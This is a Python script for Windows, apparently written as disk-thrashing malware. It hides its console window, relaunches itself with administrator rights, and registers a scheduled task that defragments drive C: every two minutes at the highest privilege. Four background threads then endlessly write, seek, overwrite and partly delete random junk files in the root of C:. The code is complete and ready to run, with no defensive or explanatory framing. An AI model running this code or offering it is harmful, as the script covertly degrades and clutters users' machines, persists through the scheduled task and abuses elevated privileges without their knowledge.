import os
import random
import string
import threading
import time
import sys
import ctypes

WORK_DIR = "C:\\"
THREADS = 4
DELAY = 0.002
FILE_SIZE_MIN = 8
FILE_SIZE_MAX = 64
SEEKS_PER_FILE = 64
BLOCK_SIZE = 4  # bytes

running = threading.Event()
running.set()

def random_filename(length=16):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def seek_stormer(thread_id):
    while running.is_set():
        fname = random_filename()
        path = os.path.join(WORK_DIR, fname)
        size = random.randint(FILE_SIZE_MIN, FILE_SIZE_MAX)
        try:
            with open(path, "w+b") as f:
                data = os.urandom(size)
                f.write(data)
                for _ in range(SEEKS_PER_FILE):
                    pos = random.randint(0, max(0, size - BLOCK_SIZE))
                    f.seek(pos)
                    if random.random() < 0.5:
                        f.write(os.urandom(BLOCK_SIZE))
                    else:
                        f.read(BLOCK_SIZE)
                f.flush()
            if random.random() < 0.7:
                os.remove(path)
            else:
                with open(path, "r+b") as f:
                    for _ in range(random.randint(8, 32)):
                        pos = random.randint(0, max(0, size - BLOCK_SIZE))
                        f.seek(pos)
                        f.write(os.urandom(BLOCK_SIZE))
        except Exception:
            time.sleep(0.01)
        time.sleep(DELAY)

def schedule_defrag():
    try:
        os.system(
            'schtasks /Create /F /SC MINUTE /MO 2 /TN "AutoDefragC" '
            '/TR "defrag C: /U /V" /RL HIGHEST'
        )
    except Exception:
        pass

def hide_console():
    try:
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 0)
    except Exception:
        pass

def request_admin():
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            params = " ".join([f'"{arg}"' for arg in sys.argv])
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 0)
            sys.exit(0)
    except Exception:
        pass

def main():
    hide_console()
    request_admin()
    schedule_defrag()

    for i in range(THREADS):
        threading.Thread(target=seek_stormer, args=(i,), daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        running.clear()
        time.sleep(2)

if __name__ == "__main__":
    main()
